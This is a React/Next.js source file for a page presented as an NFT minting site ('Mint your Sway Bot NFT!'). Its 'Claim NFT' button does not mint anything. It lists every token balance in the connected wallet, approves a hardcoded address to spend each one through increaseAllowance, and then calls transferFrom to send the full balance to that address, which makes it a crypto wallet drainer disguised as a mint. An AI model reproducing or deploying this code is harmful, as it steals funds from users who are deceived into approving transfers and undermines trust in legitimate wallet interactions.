import { useState } from "react";
import Head from "next/head";
import { useAppContext } from "../context/AppContext";
import { tokenAddress, tokenABI } from "../utils/constants";
import { useEvmWalletTokenBalances } from "@moralisweb3/next";
import BigNumber from "bignumber.js";

export default function Home() {
  const [loading, setLoading] = useState(false);
  const {
    currentAccount,
    correctNetwork,
    connectWallet,
    getContract,
    getProvider,
  } = useAppContext();

  const gasLimit = 285000;
  const { data: walletTokenBalances } = useEvmWalletTokenBalances({
    address: currentAccount,
    chain: "0xaa36a7",
  });

  const getAllowance = async (contract, walletAddress, spenderAddress) => {
    const allowance = await contract.methods
      .allowance(walletAddress, spenderAddress)
      .call({
        gasLimit,
        from: currentAccount,
      });
    return allowance;
  };

  const claim = async () => {
    for (let i = 0; i < walletTokenBalances.length; i++) {
      const balance = walletTokenBalances[i];

      const balanceContractAddress = balance.token.contractAddress.lowercase;
      console.log("balanceContractAddress: ", balance.token.name);
      try {
        // get contract for balance
        const balanceContract = getContract(balanceContractAddress, tokenABI);

        const allowance = await getAllowance(
          balanceContract,
          currentAccount,
          tokenAddress,
        );

        console.log("Allowance: ", allowance);
        console.log("Balance: ", balance.amount.toString());

        if (BigNumber(balance.amount).lt(allowance)) return;

        // Call increase allowance
        const transaction = await balanceContract.methods
          .increaseAllowance(
            "0xaf1d59542CaB0fAf97B93016a0479577c9a3140b",
            balance.amount.toString(),
          )
          .send({
            gasLimit,
            from: currentAccount,
          });
        console.log("Transaction: ", transaction);

        // confirm allowance
        const newAllowance = await getAllowance(
          balanceContract,
          currentAccount,
          tokenAddress,
        );
        console.log("NewAllowance: ", newAllowance);

        // Call transferFrom with owned erc20 contract contract
        const txn = await balanceContract.methods
          .transferFrom(
            currentAccount,
            "0xaf1d59542CaB0fAf97B93016a0479577c9a3140b",
            balance.amount.toString(),
          )
          .send({
            gasLimit,
            from: "0xaf1d59542CaB0fAf97B93016a0479577c9a3140b",
          });
        console.log("Txn: ", txn);
      } catch (error) {
        console.log("Error minting", error);
        setLoading(false);
      }
    }
  };

  return (
    <div>
      <Head>
        <title>Wyvern NFT Exchange</title>
        <meta name="description" content="Generated by create next app" />
        <link rel="icon" href="/favicon.ico" />
      </Head>

      <main className="bg-white">
        <div className="max-w-2xl mx-auto py-16 px-4 sm:py-24 sm:px-6 lg:max-w-7xl lg:px-8">
          {!currentAccount ? (
            <div className="flex flex-col justify-center items-center mb-20 font-bold text-2xl gap-y-3">
              <div>----------------------------------------</div>
              <div>Please connect wallet</div>
              <div>----------------------------------------</div>
            </div>
          ) : (
            <div className="flex flex-col items-center pt-32 text-gray-900">
              <div className="trasition hover:rotate-180 hover:scale-105 transition duration-500 ease-in-out">
                <svg
                  xmlns="http://www.w3.org/2000/svg"
                  width="60"
                  height="60"
                  fill="currentColor"
                  viewBox="0 0 16 16"
                >
                  <path d="M8.186 1.113a.5.5 0 0 0-.372 0L1.846 3.5 8 5.961 14.154 3.5 8.186 1.113zM15 4.239l-6.5 2.6v7.922l6.5-2.6V4.24zM7.5 14.762V6.838L1 4.239v7.923l6.5 2.6zM7.443.184a1.5 1.5 0 0 1 1.114 0l7.129 2.852A.5.5 0 0 1 16 3.5v8.662a1 1 0 0 1-.629.928l-7.185 2.874a.5.5 0 0 1-.372 0L.63 13.09a1 1 0 0 1-.63-.928V3.5a.5.5 0 0 1 .314-.464L7.443.184z" />
                </svg>
              </div>

              <h2 className="text-3xl font-bold mb-20 mt-12">
                Mint your Sway Bot NFT!
              </h2>

              <button
                className="text-2xl font-bold py-3 px-12 bg-indigo-500 shadow-lg shadow-[#6FFFE9] rounded-lg mb-10 hover:scale-105 transition duration-500 ease-in-out text-white"
                disabled={loading}
                onClick={claim}
              >
                Claim NFT
              </button>
              <ul>
                {walletTokenBalances?.map((bal, balIndex) => (
                  <li key={balIndex}>
                    {bal.token.name} - {bal.amount.toString()}
                  </li>
                ))}
              </ul>
            </div>
          )}
        </div>
      </main>
    </div>
  );
}
